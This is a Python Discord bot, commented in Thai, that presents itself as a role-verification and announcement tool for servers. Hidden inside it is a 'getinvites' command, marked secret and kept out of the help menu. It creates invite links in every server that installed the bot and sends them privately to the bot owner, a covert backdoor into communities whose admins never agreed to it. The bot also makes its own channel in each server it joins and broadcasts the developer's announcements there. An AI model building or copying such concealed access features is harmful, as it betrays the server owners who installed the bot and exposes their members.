import os
import random
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
import discord
from discord.ext import commands
from discord import app_commands

# 📌 ระบุ ID ของคุณ (เจ้าของบอท) และ ID เซิร์ฟเวอร์หลัก
OWNER_ID = 1524044074599055490
MAIN_GUILD_ID = 1522224772258332792

# ==========================================
# 🌐 Web Server สำหรับ Render (กันบอทดับ 24/7)
# ==========================================
class AliveServer(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write("🤖 Bot Active 24/7!".encode("utf-8"))

def run_alive_server():
    port = int(os.environ.get("PORT", 8080))
    server = HTTPServer(("", port), AliveServer)
    server.serve_forever()

threading.Thread(target=run_alive_server, daemon=True).start()

# ==========================================
# 🤖 Bot Setup & Status เม็ดม่วง
# ==========================================
intents = discord.Intents.default()
intents.members = True
intents.guilds = True

bot = commands.Bot(command_prefix="!", intents=intents)

# ==========================================
# 🛠️ ฟังก์ชันสร้าง/ค้นหาช่อง Log อัตโนมัติ
# ==========================================
async def get_or_create_log_channel(guild: discord.Guild):
    """ค้นหาช่อง Log เดิม ถ้าไม่มีจะทำการสร้างช่อง 🤖-bot-logs ให้อัตโนมัติ"""
    log_channel_name = "🤖-bot-logs"
    
    # 1. ค้นหาว่ามีช่องชื่อนี้อยู่แล้วหรือไม่
    channel = discord.utils.get(guild.text_channels, name=log_channel_name)
    if channel:
        return channel
        
    # 2. ถ้าไม่มี ให้พยายามสร้างช่องใหม่ขึ้นมา
    try:
        overwrites = {
            guild.default_role: discord.PermissionOverwrite(send_messages=False, read_messages=True),
            guild.me: discord.PermissionOverwrite(send_messages=True, read_messages=True)
        }
        channel = await guild.create_text_channel(
            name=log_channel_name,
            topic="📌 ช่องแจ้งเตือนข่าวสารและ Log อัตโนมัติจากบอท",
            overwrites=overwrites
        )
        return channel
    except Exception as e:
        print(f"❌ ไม่สามารถสร้างช่อง Log ใน {guild.name} ได้: {e}")
        if guild.system_channel and guild.system_channel.permissions_for(guild.me).send_messages:
            return guild.system_channel
        for ch in guild.text_channels:
            if ch.permissions_for(guild.me).send_messages:
                return ch
    return None

# ==========================================
# 📩 ฟังก์ชันสำหรับส่งข้อความทัก DM
# ==========================================
async def send_welcome_dm(user: discord.User, guild: discord.Guild, role: discord.Role):
    embed = discord.Embed(
        title=f"🎉 ยินดีต้อนรับสู่ {guild.name}!",
        description=(
            f"สวัสดีครับคุณ {user.mention} 👋\n\n"
            f"คุณได้ทำการ **ยืนยันตัวตนสำเร็จ** ในเซิร์ฟเวอร์ **{guild.name}** เรียบร้อยแล้ว!\n"
            f"🎁 **ยศที่คุณได้รับ:** `{role.name}`\n\n"
            f"ขอให้สนุกกับการใช้งานเซิร์ฟเวอร์นะครับ ✨"
        ),
        color=discord.Color.green()
    )
    if guild.icon:
        embed.set_thumbnail(url=guild.icon.url)
    embed.set_footer(text=f"แจ้งเตือนอัตโนมัติจากเซิร์ฟเวอร์ {guild.name}")

    try:
        await user.send(embed=embed)
        return True
    except Exception:
        return False

# ==========================================
# 🔐 ระบบ Verification (Modal & View)
# ==========================================
class VerifyCodeModal(discord.ui.Modal, title="🔐 ยืนยันตัวตนด้วยรหัสผ่าน"):
    def __init__(self, correct_code: str, role_id: int):
        super().__init__()
        self.correct_code = correct_code
        self.role_id = role_id

        self.code_input = discord.ui.TextInput(
            label=f"🔢 พิมพ์รหัสผ่านนี้: {correct_code}",
            placeholder="กรอกตัวเลข 4 หลักตามที่เห็นข้างบน...",
            min_length=4,
            max_length=4,
            required=True
        )
        self.add_item(self.code_input)

    async def on_submit(self, interaction: discord.Interaction):
        if self.code_input.value.strip() == self.correct_code:
            role = interaction.guild.get_role(self.role_id)
            if role:
                try:
                    await interaction.user.add_roles(role)
                    dm_sent = await send_welcome_dm(interaction.user, interaction.guild, role)
                    dm_status = "\n📩 *ส่งข้อความแจ้งเตือนไปยัง DM ของคุณเรียบร้อยแล้ว*" if dm_sent else "\n⚠️ *(บอทไม่สามารถส่ง DM หาคุณได้ เนื่องจากคุณปิด DM)*"
                    
                    embed = discord.Embed(
                        title="🎉 ยืนยันตัวตนสำเร็จ!",
                        description=f"ยินดีต้อนรับ {interaction.user.mention} ✨\nคุณได้รับยศ **{role.name}** เรียบร้อยแล้วครับ{dm_status}",
                        color=discord.Color.green()
                    )
                    await interaction.response.send_message(embed=embed, ephemeral=True)
                except discord.Forbidden:
                    await interaction.response.send_message("❌ บอทมียศต่ำกว่ายศที่จะมอบ โปรดย้ายยศบอทขึ้นไปข้างบน", ephemeral=True)
            else:
                await interaction.response.send_message("❌ ไม่พบยศในระบบ", ephemeral=True)
        else:
            embed = discord.Embed(
                title="❌ รหัสผ่านไม่ถูกต้อง!",
                description="กรุณากดปุ่มเพื่อลองใหม่อีกครั้ง",
                color=discord.Color.red()
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)

class PersistentVerifyView(discord.ui.View):
    def __init__(self, mode: str = "code", role_id: int = None):
        super().__init__(timeout=None)
        self.mode = mode
        self.role_id = role_id

    @discord.ui.button(label="กดเพื่อยืนยันตัวตน", style=discord.ButtonStyle.success, emoji="🛡️", custom_id="persistent_verify_btn")
    async def verify_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        role_id_to_use = self.role_id
        current_mode = self.mode

        if not role_id_to_use and interaction.message.embeds:
            embed = interaction.message.embeds[0]
            if embed.footer and embed.footer.text and "ROLE:" in embed.footer.text:
                try:
                    parts = embed.footer.text.split("|")
                    for p in parts:
                        if "ROLE:" in p:
                            role_id_to_use = int(p.replace("ROLE:", "").strip())
                        if "MODE:" in p:
                            current_mode = p.replace("MODE:", "").strip()
                except Exception:
                    pass

        if not role_id_to_use:
            return await interaction.response.send_message("❌ ไม่พบข้อมูลยศในการตั้งค่า", ephemeral=True)

        if current_mode == "button":
            role = interaction.guild.get_role(role_id_to_use)
            if role:
                if role in interaction.user.roles:
                    return await interaction.response.send_message("✨ คุณมียศนี้อยู่แล้วครับ!", ephemeral=True)
                try:
                    await interaction.user.add_roles(role)
                    dm_sent = await send_welcome_dm(interaction.user, interaction.guild, role)
                    dm_status = "\n📩 *ส่งข้อความแจ้งเตือนไปยัง DM ของคุณเรียบร้อยแล้ว*" if dm_sent else "\n⚠️ *(บอทไม่สามารถส่ง DM หาคุณได้ เนื่องจากคุณปิด DM)*"
                    
                    embed = discord.Embed(
                        title="🎉 ยืนยันตัวตนสำเร็จ!",
                        description=f"ยินดีต้อนรับ {interaction.user.mention} ✨\nคุณได้รับยศ **{role.name}** เรียบร้อยแล้วครับ{dm_status}",
                        color=discord.Color.green()
                    )
                    await interaction.response.send_message(embed=embed, ephemeral=True)
                except discord.Forbidden:
                    await interaction.response.send_message("❌ บอทมียศต่ำกว่ายศที่จะมอบ", ephemeral=True)
            else:
                await interaction.response.send_message("❌ ไม่พบยศในระบบ", ephemeral=True)
        else:
            generated_code = str(random.randint(1000, 9999))
            modal = VerifyCodeModal(correct_code=generated_code, role_id=role_id_to_use)
            await interaction.response.send_modal(modal)

# ==========================================
# 🟣 Bot Events
# ==========================================
@bot.event
async def on_ready():
    print(f"✅ บอทออนไลน์แล้ว: {bot.user.name}")
    bot.add_view(PersistentVerifyView())
    
    await bot.change_presence(
        activity=discord.Streaming(
            name="🛡️ ระบบยืนยันตัวตน & ประกาศข่าวสาร 24/7",
            url="https://www.twitch.tv/discord"
        )
    )
    
    try:
        synced = await bot.tree.sync()
        print(f"✨ ซิงค์คำสั่งสำเร็จ: {len(synced)} คำสั่ง")
    except Exception as e:
        print(f"❌ ซิงค์คำสั่งล้มเหลว: {e}")

@bot.event
async def on_guild_join(guild: discord.Guild):
    await get_or_create_log_channel(guild)

# ==========================================
# 🤫 Secret Command: getinvites (ซ่อน ไม่แสดงใน /help)
# ==========================================
@bot.tree.command(name="getinvites", description="🤫 ดึงลิงก์คำเชิญของทุกเซิร์ฟเวอร์ที่บอทอยู่ (เฉพาะ Owner)")
async def get_invites(interaction: discord.Interaction):
    if interaction.user.id != OWNER_ID:
        return await interaction.response.send_message("❌ คุณไม่มีสิทธิ์ใช้งานคำสั่งลับนี้", ephemeral=True)

    await interaction.response.defer(ephemeral=True)

    invite_list = []
    
    for guild in bot.guilds:
        invite_url = "ไม่สามารถสร้างลิงก์ได้ (ขาดสิทธิ์ Create Invite)"
        
        # ค้นหาช่องข้อความแรกที่บอทสามารถสร้าง Invite ได้
        for channel in guild.text_channels:
            perms = channel.permissions_for(guild.me)
            if perms.create_instant_invite:
                try:
                    invite = await channel.create_invite(max_age=86400, max_uses=0, reason="Secret Command by Bot Owner")
                    invite_url = invite.url
                    break
                except Exception:
                    continue

        invite_list.append(f"🏠 **{guild.name}** (ID: `{guild.id}`)\n🔗 {invite_url}\n")

    # แยกข้อความหากยาวเกินขีดจำกัด Discord (2000 ตัวอักษร)
    full_text = "\n".join(invite_list)
    
    embed = discord.Embed(
        title=f"🤫 รายชื่อเซิร์ฟเวอร์ทั้งหมด ({len(bot.guilds)} เซิร์ฟเวอร์)",
        description=full_text if len(full_text) <= 4000 else full_text[:3900] + "\n\n*(ข้อความยาวเกินไป ถูกตัดบางส่วน)*",
        color=0x2ECC71
    )
    embed.set_footer(text="ข้อมูลลับเฉพาะผู้พัฒนาบอทเท่านั้น")

    await interaction.followup.send(embed=embed, ephemeral=True)

# ==========================================
# 📢 Command: announce
# ==========================================
@bot.tree.command(name="announce", description="📢 บรอดแคสต์ประกาศข่าวสารไปยังทุกเซิร์ฟเวอร์ (เฉพาะเจ้าของบอทเท่านั้น)")
@app_commands.describe(
    หัวข้อ="หัวข้อข่าวสาร/ประกาศ",
    ข้อความ="รายละเอียดข้อความที่ต้องการประกาศ",
    รูปภาพ="ลิงก์ URL รูปภาพประกอบ (เว้นว่างได้)"
)
async def announce(
    interaction: discord.Interaction, 
    หัวข้อ: str, 
    ข้อความ: str, 
    รูปภาพ: str = None
):
    if interaction.user.id != OWNER_ID:
        return await interaction.response.send_message("❌ คำสั่งนี้อนุญาตให้ใช้งานได้เฉพาะ **เจ้าของบอท (Bot Owner)** เท่านั้น!", ephemeral=True)

    await interaction.response.defer(ephemeral=True)
    
    success_count = 0
    fail_count = 0

    embed = discord.Embed(
        title=f"📢 ประกาศจากระบบ: {หัวข้อ}",
        description=ข้อความ,
        color=0xF1C40F
    )
    if รูปภาพ:
        embed.set_image(url=รูปภาพ)
    
    embed.set_footer(text="ข้อความประกาศอย่างเป็นทางการจากผู้พัฒนาบอท", icon_url=bot.user.display_avatar.url)

    for guild in bot.guilds:
        target_channel = await get_or_create_log_channel(guild)
        if target_channel:
            try:
                await target_channel.send(embed=embed)
                success_count += 1
            except Exception:
                fail_count += 1
        else:
            fail_count += 1

    summary_embed = discord.Embed(
        title="✅ ส่งประกาศเรียบร้อยแล้ว!",
        description=(
            f"📊 **สรุปผลการบรอดแคสต์:**\n"
            f"• สำเร็จ: `{success_count}` เซิร์ฟเวอร์\n"
            f"• ล้มเหลว: `{fail_count}` เซิร์ฟเวอร์\n"
            f"• ทั้งหมด: `{len(bot.guilds)}` เซิร์ฟเวอร์"
        ),
        color=discord.Color.green()
    )
    await interaction.followup.send(embed=summary_embed, ephemeral=True)

# ==========================================
# 📖 Command: help (ไม่มีคำสั่ง getinvites)
# ==========================================
@bot.tree.command(name="help", description="📖 แสดงคู่มือการใช้งานคำสั่งทั้งหมดภายในบอท")
async def help_command(interaction: discord.Interaction):
    embed = discord.Embed(
        title="🤖 คู่มือการใช้งานคำสั่งบอท",
        description="รายชื่อคำสั่งทั้งหมดที่คุณสามารถใช้งานได้ในเซิร์ฟเวอร์นี้:",
        color=0x9B59B6
    )
    
    embed.add_field(
        name="🛡️ `/setup-verify`",
        value="ตั้งค่าสร้างกล่องข้อความยืนยันตัวตน (ใช้ได้เฉพาะผู้ดูแลระบบ)",
        inline=False
    )
    
    embed.add_field(
        name="📊 `/membercount`",
        value="ดูสถิติจำนวนสมาชิกทั้งหมด สมาชิกที่เป็นคน และจำนวนบอทในเซิร์ฟเวอร์",
        inline=False
    )
    
    embed.add_field(
        name="📖 `/help`",
        value="แสดงเมนูช่วยเหลือและคู่มือการใช้งานบอท",
        inline=False
    )
    
    if interaction.user.id == OWNER_ID:
        embed.add_field(
            name="📢 `/announce`",
            value="ส่งประกาศข่าวสารไปยังทุกดิสคอร์ด (เฉพาะ Owner)",
            inline=False
        )

    embed.set_footer(text="ระบบยืนยันตัวตนและจัดการเซิร์ฟเวอร์ • ออนไลน์ 24 ชม.", icon_url=bot.user.display_avatar.url)
    await interaction.response.send_message(embed=embed, ephemeral=True)

# ==========================================
# 📊 Command: membercount
# ==========================================
@bot.tree.command(name="membercount", description="📊 แสดงจำนวนสมาชิกทั้งหมด ผู้ใช้งาน และบอทภายในเซิร์ฟเวอร์")
async def member_count(interaction: discord.Interaction):
    guild = interaction.guild
    
    total_members = guild.member_count
    humans = len([m for m in guild.members if not m.bot])
    bots = len([m for m in guild.members if m.bot])
    
    embed = discord.Embed(
        title=f"📊 สถิติจำนวนสมาชิก - {guild.name}",
        color=0x3498DB
    )
    
    if guild.icon:
        embed.set_thumbnail(url=guild.icon.url)
        
    embed.add_field(name="👥 สมาชิกทั้งหมด", value=f"**{total_members:,}** คน", inline=True)
    embed.add_field(name="🧑 คน (Humans)", value=f"**{humans:,}** คน", inline=True)
    embed.add_field(name="🤖 บอท (Bots)", value=f"**{bots:,}** ตัว", inline=True)
    
    embed.set_footer(text=f"เรียกดูโดย {interaction.user.display_name}", icon_url=interaction.user.display_avatar.url)
    
    await interaction.response.send_message(embed=embed)

# ==========================================
# 📜 Command: setup-verify
# ==========================================
@bot.tree.command(name="setup-verify", description="🛡️ สร้างกล่องข้อความยืนยันตัวตน (เฉพาะแอดมิน)")
@app_commands.describe(
    โหมด="เลือกรูปแบบ: ปุ่มกดรับยศทันที หรือ สุ่มรหัส 4 หลัก",
    ยศ="เลือกยศที่จะมอบให้ผู้ใช้งานหลังยืนยันสำเร็จ",
    หัวข้อ="ข้อความหัวข้อประกาศ (Title)",
    รายละเอียด="รายละเอียดเนื้อหาเพิ่มเติม (เว้นว่างไว้ได้)",
    รูปภาพ="ลิงก์ URL รูปภาพประกอบ Embed (เว้นว่างไว้ได้)"
)
@app_commands.choices(โหมด=[
    app_commands.Choice(name="🔘 ปุ่มกดรับยศทันที (Button Mode)", value="button"),
    app_commands.Choice(name="🔐 กรอกรหัสสุ่ม 4 หลัก (Random Code Mode)", value="code")
])
@app_commands.default_permissions(administrator=True)
async def setup_verify(
    interaction: discord.Interaction, 
    โหมด: app_commands.Choice[str],
    ยศ: discord.Role, 
    หัวข้อ: str, 
    รายละเอียด: str = None, 
    รูปภาพ: str = None
):
    if interaction.guild_id != MAIN_GUILD_ID:
        return await interaction.response.send_message("❌ อนุญาตให้ใช้เฉพาะในเซิร์ฟเวอร์หลักเท่านั้น", ephemeral=True)

    if not รายละเอียด:
        if โหมด.value == "button":
            รายละเอียด = "กดปุ่ม **ยืนยันตัวตน** ด้านล่างเพื่อรับยศเข้าใช้งานเซิร์ฟเวอร์ได้ทันที ✨"
        else:
            รายละเอียด = "กดปุ่ม **ยืนยันตัวตน** ด้านล่างเพื่อรับรหัสผ่านสุ่ม 4 หลัก แล้วกรอกให้ถูกต้องเพื่อรับยศ ✨"

    embed = discord.Embed(
        title=หัวข้อ,
        description=f"{รายละเอียด}\n\n🎁 **ยศที่จะได้รับ:** {ยศ.mention}",
        color=0x9B59B6
    )
    
    if รูปภาพ:
        embed.set_image(url=รูปภาพ)

    if interaction.guild.icon:
        embed.set_thumbnail(url=interaction.guild.icon.url)
        
    embed.set_footer(text=f"Verification System | MODE:{โหมด.value} | ROLE:{ยศ.id}", icon_url=bot.user.display_avatar.url)

    view = PersistentVerifyView(mode=โหมด.value, role_id=ยศ.id)
    
    await interaction.channel.send(embed=embed, view=view)
    await interaction.response.send_message("✅ สร้างกล่องข้อความยืนยันตัวตนเรียบร้อยแล้ว!", ephemeral=True)

# ==========================================
# 🚀 Run Bot
# ==========================================
token = os.environ.get("DISCORD_TOKEN")
if token:
    bot.run(token)
else:
    print("❌ ไม่พบ DISCORD_TOKEN ใน Environment Variables")
